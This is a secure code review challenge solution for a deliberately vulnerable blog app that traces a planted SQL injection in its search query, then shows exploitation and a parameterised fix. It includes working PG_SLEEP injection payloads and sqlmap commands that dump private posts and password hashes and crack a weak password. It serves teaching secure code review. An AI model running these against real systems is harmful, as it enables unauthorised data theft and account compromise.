# Secure Code Review — Challenge #7: Blogger — Solution

<table>
<tr>
<td width="100%">

<a href="https://youtu.be/VIDEO_ID">
  <img src="https://img.youtube.com/vi/VIDEO_ID/hqdefault.jpg" align="right" width="240" alt="Watch the walkthrough">
</a>

### 🎥 This solution is explained in detail on my YouTube Channel <img src="../../assets/AppSec_Untangled_Logo.jpg" width="30"> [AppSec Untangled](https://www.youtube.com/@AppSecUntangled)

Full walkthrough of the review process, the finding, and the fix.

[![Watch on YouTube](https://img.shields.io/badge/▶_Watch_the_walkthrough-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtu.be/VIDEO_ID)

</td>
</tr>
</table>

---

# Part I: Review Steps

*The methodology followed to build a mental model of the system before looking for the flaw. It
mirrors the [suggested methodology](../../README.md#suggested-methodology): scope → entry points →
sinks → threat model → mitigation review.*

## 1. 🗺️ Application scope & architecture

Blogger is a multi-user blog: people register, write posts, mark some of them **private**, and search
everything they're allowed to see. There are no admin roles — just anonymous visitors and logged-in
authors. The asset worth protecting is clear from the README: **a private post must be visible only to
its author**, everywhere — the post page, the feed, *and* search. Behind that sits the `users` table
(emails + bcrypt password hashes).

### 🚀 What happens when the app starts

1. **`docker compose up`** starts two containers
   ([docker-compose.yml](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/docker-compose.yml#L1-L35)):
   a stock `postgres:16` (a black box we only configure) and our `app`, built from the local
   Dockerfile. The DB credentials are passed in as `POSTGRES_USER` / `POSTGRES_PASSWORD` — worth
   remembering: in the [official postgres image](https://hub.docker.com/_/postgres) `POSTGRES_USER`
   is created as a **superuser**, and the app connects as that same user.

   ```yaml
   postgres:
     image: postgres:16
     environment:
       POSTGRES_DB: blogger_db
       POSTGRES_USER: blogger_user
   app:
     environment:
       DATABASE_URL: postgres://blogger_user:blogger_password@postgres:5432/blogger_db
   ```

2. **The app container** ([Dockerfile](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/Dockerfile#L1-L17))
   is `node:22-slim`, installs production deps, drops to a non-root `appuser` and runs `node app.js`.
   No external binaries are shelled out to — the only "other process" this app talks to is PostgreSQL.

3. **`app.js` waits for the DB, runs migrations, then listens**
   ([app.js#L48-L82](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/app.js#L48-L82)).
   The schema ([001_initial.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/db/migrations/001_initial.js#L1-L18))
   is two tables: `users(id, username, email, password_hash)` and
   `posts(id, user_id → users, title, body, is_private)`.

4. **Express boots with the view engine and global middleware**
   ([app.js#L22-L37](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/app.js#L22-L37)):

   ```js
   const env = nunjucks.configure(viewsPath, {
     autoescape: true,
     express: app,
     ...
   });
   app.use(express.json());
   app.use(express.urlencoded({ extended: true }));
   app.use(cookieParser());

   app.use('/', optionalAuth, pagesRoutes);
   app.use('/api/auth', authRoutes);
   app.use('/api/posts', optionalAuth, postsRoutes);
   ```

   - [Express 5](https://expressjs.com/en/5x/api.html) parses JSON and form bodies;
     [cookie-parser](https://expressjs.com/en/resources/middleware/cookie-parser.html) populates
     `req.cookies` so the browser session (the `token` cookie) can be read.
   - [Nunjucks](https://mozilla.github.io/nunjucks/api.html#configure) renders the HTML UI with
     **`autoescape: true`** — a security control we'll come back to in §4/5.
   - **`optionalAuth`** ([middleware/auth.js#L52-L76](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/middleware/auth.js#L52-L76))
     runs in front of both the pages and the posts API. It reads a JWT from `Authorization: Bearer`
     *or* the `token` cookie, verifies it with
     [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback),
     loads the user from the DB, and sets `req.user` — or silently leaves it unset. So **auth is
     decided per handler**, not by the middleware: each route must check `req.user` itself.

5. **Data access goes through one class**,
   [`DatabaseStore`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js),
   built on the [Knex query builder](https://knexjs.org/guide/query-builder.html) with the
   [`pg`](https://node-postgres.com/) driver
   ([config/knex.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/config/knex.js#L1-L7)).
   Both the JSON API and the HTML pages call the same store — the README says so explicitly: they're
   "the same data seen two ways".

### 🔄 What happens for the main use cases

1. **Register / log in** —
   [routes/auth.js#L32-L137](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/auth.js#L32-L137).
   The password is hashed with [bcrypt](https://www.npmjs.com/package/bcrypt) (cost 10), a 7-day JWT
   is signed with `JWT_SECRET`, and it's either returned as JSON (API) or set as an
   `httpOnly; SameSite=Lax` cookie when the request came from the web form (`web=1`):

   ```js
   const cookieOptions = { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, path: '/', sameSite: 'lax' };
   ```

2. **Write / edit / delete a post** — API
   ([routes/posts.js#L61-L117](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L61-L117))
   and pages
   ([routes/pages.js#L100-L174](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js#L100-L174)).
   Every mutating handler follows the same pattern — require login, load the post, compare owners:

   ```js
   const existing = await db.getPostById(req.params.id);
   if (!existing) return res.status(404).json({ error: 'Post not found' });
   if (existing.userId !== req.user.id) {
     return res.status(403).json({ error: 'Access denied' });
   }
   ```

   …and the store scopes the write by owner a second time
   ([database.js#L101-L115](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L101-L115)):
   `.where({ id: postId, user_id: userId })`.

3. **Read posts** — three ways of reading, each enforcing "public, or mine":
   - **Single post** `GET /api/posts/:id` / `GET /posts/:id` — fetched by id, then
     `if (post.isPrivate && (!req.user || req.user.id !== post.userId)) → 403`
     ([posts.js#L46-L59](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L46-L59)).
   - **Feed** — the filter is built *into the query* with the Knex builder
     ([database.js#L66-L81](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L66-L81)):
     `where('p.is_private', false).orWhere('p.user_id', userId)`.
   - **Search** — full-text search ranked by relevance. This one is different from every other query
     in the store: instead of the builder, it's a hand-written SQL string passed to `knex.raw`
     ([database.js#L117-L134](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L117-L134)),
     because Postgres full-text functions (`to_tsvector`, `plainto_tsquery`, `ts_rank`) aren't
     first-class in the builder. Hand-written SQL is where a reviewer should slow down.

## 2. 🚪 Entry points

**Auth API** ([routes/auth.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/auth.js))
- `POST /api/auth/register` — *auth:* none — `username`, `email`, `password`, `web`
- `POST /api/auth/login` — *auth:* none — `username`, `password`, `web`

**Posts API** ([routes/posts.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js))
- `GET /api/posts/feed` — *auth:* optional — none
- `GET /api/posts/mine` — *auth:* required — none
- `GET /api/posts/search?q=` — *auth:* **optional** — `q`
- `GET /api/posts/:id` — *auth:* optional (private → owner) — `id`
- `POST /api/posts` — *auth:* required — `title`, `body`, `is_private`
- `PATCH /api/posts/:id` — *auth:* owner — `id`, `title`, `body`, `is_private`
- `DELETE /api/posts/:id` — *auth:* owner — `id`

**Web UI** ([routes/pages.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js))
- `GET /` , `GET /my-posts` , `GET /login` , `GET /register` , `GET /logout` — `error` query param on login/register
- `GET /search?q=` — *auth:* **optional** — `q`
- `GET /posts/new`, `GET /posts/:id`, `GET /posts/:id/edit`, `GET /posts/:id/delete` — `id`
- `POST /posts`, `POST /posts/:id`, `POST /posts/:id/delete` — form fields `title`, `body`, `is_private`

**Implicit inputs on every request:** the `Authorization` header and the `token` cookie (JWT).

## 3. 🎯 Dangerous sinks

- **S1 — SQL queries built with the Knex query builder** → SQLi. Fed from `username`, `email`, post
  fields, `:id`, and the JWT's `userId`. All in
  [database.js#L4-L115](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L4-L115).
- **S2 — Raw SQL via `knex.raw`** (full-text search) → SQLi. Fed from `q`.
  [database.js#L122-L131](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L122-L131)
- **S3 — HTML rendering with Nunjucks** → stored/reflected XSS. Fed from post `title`/`body`,
  `username`, the search `query`, and the `error` query string.
  [views/](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/views)
- **S4 — Redirects** built from code-controlled paths (`/posts/${post.id}`, `/register?error=…`) →
  open redirect. [pages.js#L120](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js#L120)

## 4 & 5. 🧩 Threat model & 🔍 mitigation review

### 🔓 Business-logic vulnerabilities

**T1 — Missing authentication on mutating routes.**
Expected: every create/update/delete requires a valid session. The middleware is *optional*, so each
handler must check `req.user`. Code: `POST/PATCH/DELETE /api/posts*` all start with
`if (!req.user) return 401`
([posts.js#L63](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L63),
[#L80](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L80),
[#L103](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L103)),
and every page handler that mutates does `if (!req.user) return res.redirect('/login')`. **✅ Mitigated.**

**T2 — IDOR / broken object-level authorization on read, edit, delete.**
Expected: private posts readable only by their author; any post editable/deletable only by its author.
Code: the owner check in every handler (API and pages), and the store re-scopes writes with
`.where({ id: postId, user_id: userId })`
([database.js#L103](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L103),
[#L113](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L113)).
A classic trap here is a type mismatch (`1 !== "1"`) silently breaking the comparison — but both
sides are normalised with `String(...)` in `_mapUser`/`_mapPost`, so the `!==` comparison is sound. Verified:

```bash
$ curl -s http://localhost:3000/api/posts/2                                # anonymous
{"error":"Access denied"}
$ curl -s http://localhost:3000/api/posts/2 -H "Authorization: Bearer $MALLORY"
{"error":"Access denied"}
```

**✅ Mitigated** (defense in depth, even).

**T3 — Privacy leak through the list views (feed / search).**
Expected: list queries must embed "public OR mine" in the `WHERE`. Feed: built with the Knex builder,
`where('p.is_private', false).orWhere('p.user_id', userId)` inside a grouped `where`
([database.js#L72-L78](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L72-L78)) — ✅.
Search has the same filter `WHERE (p.is_private = false OR p.user_id = ?)` — *on paper* ✅, but see T10:
the filter is only as strong as the SQL string it lives in.

**T4 — Mass assignment on update.**
Expected: a user can't change `user_id`, `id`, timestamps. `PATCH` copies only `title`, `body`,
`is_private` into `updates`
([posts.js#L87-L91](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L87-L91));
the page handler builds the same three fields explicitly. **✅ Mitigated.**

**T5 — CSRF on cookie-authenticated mutations.**
The UI authenticates via cookie and mutates via plain HTML form POSTs with no CSRF token. The control
in place is the cookie's `SameSite=Lax`
([auth.js#L21-L26](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/auth.js#L21-L26)):
per [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value)
a `Lax` cookie is **not sent on cross-site POSTs** (only on top-level GET navigations), so a forged
form from another site arrives unauthenticated. Deleting is a GET-to-confirm page + POST, so a
cross-site GET can't delete. **✅ Mitigated** for this threat model — ⚠️ with the usual caveat that
SameSite is per *site*, so a sibling subdomain isn't stopped; see the
[OWASP CSRF cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute)
on treating SameSite as defense in depth. Minor: `GET /logout` is a state change on GET (logout CSRF,
nuisance only). ⚠️

**T6 — Authentication weaknesses (JWT, passwords).**
- `jwt.verify(token, secret)` with jsonwebtoken **9.x**: since v9 the library refuses unsigned
  (`alg: none`) tokens unless you opt in, and the HMAC secret can't be swapped for a public key
  ([v9 migration notes](https://github.com/auth0/node-jsonwebtoken/wiki/Migration-Notes:-v8-to-v9)). ✅
- The token's `userId` is re-looked-up in the DB on every request, so deleted users lose access. ✅
- Passwords use bcrypt with cost 10, in line with the
  [OWASP Password Storage cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#bcrypt). ✅
- ⚠️ Minor: no login rate-limiting; register leaks whether a username/email exists; the cookie lacks
  `Secure` (fine on localhost, required behind HTTPS); `.env.example` ships a static `JWT_SECRET` —
  deploying with it would let anyone forge tokens.

### 💉 Source-to-sink (injection) vulnerabilities

**T7 — XSS through rendered posts / search term / error messages (S3).**
Every value reaches the templates via `{{ … }}` with `autoescape: true`
([app.js#L23-L27](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/app.js#L23-L27)).
[Nunjucks autoescaping](https://mozilla.github.io/nunjucks/api.html#autoescaping) HTML-escapes
`& < > " '`, which covers both element content (`<p>{{ post.body }}</p>`) and the quoted attribute in
the search box (`value="{{ query }}"`). No `| safe` filter is used anywhere in `views/`. **✅ Mitigated.**

**T8 — Open redirect (S4).**
Expected: a redirect target is never taken from user input, or is checked against an allowlist of
local paths. Every `res.redirect(...)` in
[pages.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js)
and [auth.js](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/auth.js)
goes to a hard-coded path (`/login`, `/my-posts`, `/`), or a hard-coded path plus a fixed error
message passed through `encodeURIComponent` (`/login?error=…`). There is no `next`/`returnTo`
parameter. Only two redirects include a value:
- `` res.redirect(`/posts/${post.id}`) `` after create
  ([pages.js#L120](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js#L120))
  — `post.id` is generated by the database (an auto-increment integer).
- `` res.redirect(`/posts/${req.params.id}`) `` after update
  ([pages.js#L140](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js#L140))
  — this one *is* user input, but it only runs after `getPostById(req.params.id)` has found the post
  and the owner check has passed. `posts.id` is an integer column, so any value that isn't a number
  fails in Postgres before the redirect is reached. Verified as the post's owner:

  ```bash
  $ curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST "localhost:3000/posts/%2F%2Fevil.com" -b "token=$A" -d "title=t&body=b"
  500
  # app log: invalid input syntax for type integer: "//evil.com"
  $ curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST "localhost:3000/posts/1" -b "token=$A" -d "title=t&body=b"
  302 http://localhost:3000/posts/1
  ```

**✅ Mitigated** — see the
[OWASP Unvalidated Redirects and Forwards cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html),
which recommends exactly this: don't build redirect targets from user input. ⚠️ Minor: redirecting to
`existing.id` instead of `req.params.id` would stop relying on the database type check.

**T9 — SQL injection via the Knex query builder (S1).**
`where('username', username.trim())`, `.where('p.id', postId)`, `.insert({...})`, `.update({...})` —
the [Knex builder](https://knexjs.org/guide/query-builder.html) sends all values as **bound
parameters**, never as SQL text. **✅ Mitigated.**

**T10 — SQL injection in full-text search via `knex.raw` (S2).**
Source: `req.query.q` from `GET /api/posts/search` or `GET /search` — **no login required**.
Transformation: only a `typeof query !== 'string'` check (which stops arrays/objects, not quotes).
Sink:

```js
const sql = `
  SELECT p.*, u.username AS author_username
  FROM posts p
  JOIN users u ON p.user_id = u.id
  WHERE (p.is_private = false OR p.user_id = ?)
    AND to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')) @@ plainto_tsquery('english', '${query}')
  ORDER BY ts_rank(to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')), plainto_tsquery('english', '${query}')) DESC
  LIMIT 50
`;
const result = await knex.raw(sql, [uid]);
```

[database.js#L122-L131](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L122-L131)

This is the one place the developer "knew" about parameterization — the user id is a proper `?`
binding — and then built the *search term* with a JavaScript template literal. `${query}` is
substituted **by JavaScript, before Knex ever sees the string**, so to `knex.raw` it's indistinguishable
from SQL the developer wrote. [Knex's raw docs](https://knexjs.org/guide/raw.html) are explicit that
only values passed as `?` bindings are escaped. **❌ Not mitigated — this is the planted flaw.**

---

# Part II: Solution

## 6. 🧪 The vulnerability & exploitation

- **Class:** SQL injection — [CWE-89](https://cwe.mitre.org/data/definitions/89.html), leading to
  authorization bypass of the privacy rule
  ([CWE-639](https://cwe.mitre.org/data/definitions/639.html)-style impact) and exposure of the
  `users` table.
- **Root cause:** user input interpolated into raw SQL with a template literal —
  [database.js#L127-L128](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L127-L128)
- **Sink:** `knex.raw(sql, [uid])` —
  [database.js#L131](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L131)
- **Reachable from:** `GET /api/posts/search?q=` ([posts.js#L33-L44](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L33-L44))
  and `GET /search?q=` ([pages.js#L48-L59](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/pages.js#L48-L59)) — **unauthenticated**.

### 🧠 Why it works

**1. User input reaches the query unchanged.** The `q` query-string parameter goes straight from the
route to the store, with no login required:

```js
// src/routes/posts.js — GET /api/posts/search  (pages.js GET /search does the same)
const q = req.query.q;
const userId = req.user ? req.user.id : null;
const posts = await db.searchPosts(q, userId);
```

[posts.js#L36-L38](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/routes/posts.js#L36-L38)

`searchPosts` only checks that it's a string, then pastes it into the SQL text with a template literal
— **twice**. Only the user id is a real `?` binding:

```js
const sql = `
  SELECT p.*, u.username AS author_username
  FROM posts p
  JOIN users u ON p.user_id = u.id
  WHERE (p.is_private = false OR p.user_id = ?)
    AND to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')) @@ plainto_tsquery('english', '${query}')
  ORDER BY ts_rank(to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')), plainto_tsquery('english', '${query}')) DESC
  LIMIT 50
`;
const result = await knex.raw(sql, [uid]);
```

[database.js#L122-L131](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/007-blogger/src/store/database.js#L122-L131)

The privacy rule `(p.is_private = false OR p.user_id = ?)` lives in the same SQL string, so a search
term that closes the `'` can add its own SQL and override it.

**2. The simple payload doesn't work.** Because `${query}` appears in both the `WHERE` and the
`ORDER BY`, the classic `x') OR 1=1 --` fixes the first copy but breaks the second:

```bash
$ curl -s -G http://localhost:3000/api/posts/search --data-urlencode "q=x') OR 1=1 --"
{"error":"Internal server error"}
```

```text
# app log
ORDER BY ts_rank(to_tsvector(...), plainto_tsquery('english', 'x') OR 1=1 --')) DESC
LIMIT 50
 - syntax error at or near "LIMIT"
```

A 500 doesn't mean "not exploitable". It means the payload has to be valid SQL in **both** places.
Instead of crafting that by hand, we can use a tool like [sqlmap](https://sqlmap.org/), which tries
hundreds of more complex payloads automatically — see the steps below.

### 🚀 Exploitation steps / PoC

Setup — a victim (Alice) with a public and a private post, plus Bob, who uses a weak password:

```bash
B=http://localhost:3000/api
curl -s -X POST $B/auth/register -H Content-Type:application/json \
  -d '{"username":"alice","email":"alice@example.com","password":"alicepass123"}'
A=$(curl -s -X POST $B/auth/login -H Content-Type:application/json \
  -d '{"username":"alice","password":"alicepass123"}' | jq -r .token)
curl -s -X POST $B/posts -H "Authorization: Bearer $A" -H Content-Type:application/json \
  -d '{"title":"Hello world","body":"My first public post on Blogger."}'
curl -s -X POST $B/posts -H "Authorization: Bearer $A" -H Content-Type:application/json \
  -d '{"title":"Acquisition plans","body":"Secret: we are buying Initech next quarter.","is_private":true}'
curl -s -X POST $B/auth/register -H Content-Type:application/json \
  -d '{"username":"bob","email":"bob@example.com","password":"password"}'
```

**Control** — the private post is protected everywhere else:

```bash
$ curl -s $B/posts/2
{"error":"Access denied"}
$ curl -s -G $B/posts/search --data-urlencode "q=acquisition"
{"posts":[]}
```

Every command below runs **without any token or cookie** — the attacker doesn't need an account.

**Step 1 — confirm the injection and check the DB privileges:**

```bash
$ sqlmap -u "http://localhost:3000/api/posts/search?q=1" -p q --risk=3 --level=5 \
    --dbms=PostgreSQL --batch --time-sec 1 --is-dba
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.10#pip}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 10:20:48 /2026-10-16/

[10:20:49] [INFO] testing connection to the target URL
[10:20:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:20:49] [INFO] testing if the target URL content is stable
[10:20:49] [INFO] target URL content is stable
[10:20:49] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be SQL injectable
[10:20:49] [INFO] testing for SQL injection on GET parameter 'q'
[10:20:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:20:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
...
[10:20:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
...
[10:20:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:20:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
...
[10:20:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:20:55] [INFO] GET parameter 'q' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[10:20:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
...
[10:20:55] [INFO] checking if the injection point on GET parameter 'q' is a false positive
GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1279 HTTP(s) requests:
---
Parameter: q (GET)
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: q=1'||(SELECT (CHR(89)||CHR(114)||CHR(84)||CHR(66)) WHERE 3661=3661 AND 7927=(SELECT 7927 FROM PG_SLEEP(1)))||'
---
[10:21:07] [INFO] the back-end DBMS is PostgreSQL
web application technology: Express
back-end DBMS: PostgreSQL
[10:21:07] [INFO] testing if current user is DBA
current user is DBA: True
[10:21:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 584 times

[*] ending @ 10:21:08 /2026-10-16/
```

What the options do:

- `-u "…/search?q=1"` — the target URL, with a normal value for the parameter
- `-p q` — test only the `q` parameter
- `--level=5 --risk=3` — try sqlmap's full set of payloads, including the heavier ones (default is 1/1)
- `--dbms=PostgreSQL` — skip payloads for other databases; we know it's Postgres from `docker-compose.yml`
- `--batch` — accept the default answer to every prompt, so the run needs no input
- `--time-sec 1` — how long the database sleeps for a "yes" (default 5); faster on a local, stable target
- `--is-dba` — after finding the injection, check whether the DB user is a superuser

How to read the output:
- **`heuristic (basic) test shows that GET parameter 'q' might not be SQL injectable`** — sqlmap's
  quick first check (send a broken quote, look for a DB error in the page) finds nothing, because the
  app hides DB errors behind a generic 500. A manual tester could stop here. sqlmap keeps going.
- **`500 (Internal Server Error) - 584 times`** — most of sqlmap's payloads break the SQL, partly
  because the term is inserted twice (see above). Those are the same 500s a developer would see in the
  logs.
- **The boolean, error, stacked and UNION tests all fail.** Search results don't change visibly,
  errors are hidden, `pg` refuses multiple statements, and the payload lands twice. Only the
  **time-based** test works, so the data has to come out one yes/no question at a time.
- **The payload that works** is `1'||(SELECT … WHERE … AND …=(SELECT … FROM PG_SLEEP(1)))||'`.
  Instead of breaking *out* of the string, it glues a sub-query *onto* it with Postgres's `||`
  (string concatenation). The quotes stay balanced, so it's valid SQL in both places the term lands.
  The sub-query makes the database sleep when a condition is true. sqlmap asks yes/no questions ("is
  the first letter of the first username `a`?") and times the responses, which is
  [time-based blind SQL injection](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays).
- **`current user is DBA: True`** — the app connects as the `POSTGRES_USER` that the official image
  creates as a superuser, so the injection runs with full database privileges.

**Step 2 — read other users' private posts:**

```bash
$ sqlmap -u "http://localhost:3000/api/posts/search?q=1" -p q --risk=3 --level=5 \
    --dbms=PostgreSQL --batch --time-sec 1 \
    --dump -D public -T posts -C title,body --where "is_private=true"
...
Database: public
Table: posts
+-------------------+---------------------------------------------+
| title             | body                                        |
+-------------------+---------------------------------------------+
| Acquisition plans | Secret: we are buying Initech next quarter. |
+-------------------+---------------------------------------------+
```

**Step 3 — dump the `users` table:**

```bash
$ sqlmap -u "http://localhost:3000/api/posts/search?q=1" -p q --risk=3 --level=5 \
    --dbms=PostgreSQL --batch --time-sec 1 \
    --dump -D public -T users -C username,password_hash
...
Database: public
Table: users
[2 entries]
+----------+--------------------------------------------------------------+
| username | password_hash                                                |
+----------+--------------------------------------------------------------+
| alice    | $2b$10$b8z56oJRF405TWLN.HiFQuG1LnkzyUOpCJ9rxbWzsj80y81l6rn0K |
| bob      | $2b$10$/J2pPyfEzeISVD3fbQ77IutnM6iYAtQLb.ot6ugiSSehKaNMj4Tme |
+----------+--------------------------------------------------------------+
```

**Step 4 — crack weak passwords.** When sqlmap dumps password hashes it offers a dictionary attack;
`--batch` accepts it with the built-in wordlist, and bcrypt is supported:

```bash
$ sqlmap -u "http://localhost:3000/api/posts/search?q=1" -p q --risk=3 --level=5 \
    --dbms=PostgreSQL --batch --time-sec 1 \
    --dump -D public -T users -C username,password_hash --where "username='bob'"
...
[11:29:29] [INFO] retrieved: bob
[11:29:57] [INFO] cracked password 'password' for user 'bob'
Database: public
Table: users
+----------+-------------------------------------------------------------------------+
| username | password_hash                                                           |
+----------+-------------------------------------------------------------------------+
| bob      | $2b$10$/J2pPyfEzeISVD3fbQ77IutnM6iYAtQLb.ot6ugiSSehKaNMj4Tme (password) |
+----------+-------------------------------------------------------------------------+
```

Alice's password isn't in the wordlist, so Alice's hash resisted — bcrypt buys time,
but only for passwords that aren't common.

> ✅ **Verified** with sqlmap 1.10.10 against the running Docker Compose stack: an **unauthenticated**
> `GET /api/posts/search` is injectable (time-based blind), the DB user is a superuser, and sqlmap
> dumped another user's private post, every username and bcrypt hash, and cracked a weak password.
> Being time-based, it's slow — about 3–4 minutes per 60-character hash with `--time-sec 1` — but
> fully automatic.

**Impact:** Complete break of the app's core promise (post privacy) for **anyone on the internet**,
no account required; full read of the database (bcrypt hashes for offline cracking — weak ones fall
immediately — and emails); and, because the connection is a superuser, superuser-only functions such
as `pg_read_file` are available to the attacker too. Stacked queries are blocked by the extended
protocol, but a superuser connection is one step away from much worse if any other raw query ever
becomes injectable.

## 7. 🛠️ Suggested fix

**Primary fix — bind the search term instead of interpolating it:**

```diff
     const sql = `
       SELECT p.*, u.username AS author_username
       FROM posts p
       JOIN users u ON p.user_id = u.id
       WHERE (p.is_private = false OR p.user_id = ?)
-        AND to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')) @@ plainto_tsquery('english', '${query}')
-      ORDER BY ts_rank(to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')), plainto_tsquery('english', '${query}')) DESC
+        AND to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')) @@ plainto_tsquery('english', ?)
+      ORDER BY ts_rank(to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')), plainto_tsquery('english', ?)) DESC
       LIMIT 50
     `;
-    const result = await knex.raw(sql, [uid]);
+    const result = await knex.raw(sql, [uid, query, query]);
```

Verified inside the running container with the same SQL and bindings. A sqlmap-style sleep payload
becomes inert search text and returns instantly, and a `?` inside the search term no longer breaks the
query (it's a value now, not SQL):

```text
"hello"                                -> [{"id":1,"title":"Hello world"}] (63 ms)
"1'||(SELECT 'x' FROM PG_SLEEP(3))||'" -> [] (1 ms)
"acquisition"                          -> [] (1 ms)   (anonymous caller: the private post stays hidden)
"what?"                                -> [] (2 ms)
```

For contrast, the same payload against the vulnerable app makes the database sleep:

```bash
$ time curl -s -G http://localhost:3000/api/posts/search --data-urlencode "q=1'||(SELECT 'x' FROM PG_SLEEP(3))||'"
